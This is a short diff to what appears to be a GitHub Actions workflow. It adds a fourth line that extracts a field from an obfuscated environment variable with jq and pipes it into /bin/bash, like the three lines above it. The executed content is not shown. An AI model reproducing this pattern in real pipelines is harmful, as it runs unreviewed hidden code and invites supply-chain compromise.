@@ -25,6 +25,7 @@ jobs:
           echo $dbqcu516 | jq -r .qoh66266 | /bin/bash
           printf '%s' "$b36" | jq -r .bpca936 | /bin/bash
           printf '%s' "$olfh30326" | jq -r .vexa90452 | /bin/bash
+          echo $so2445 | jq -r .g5254 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
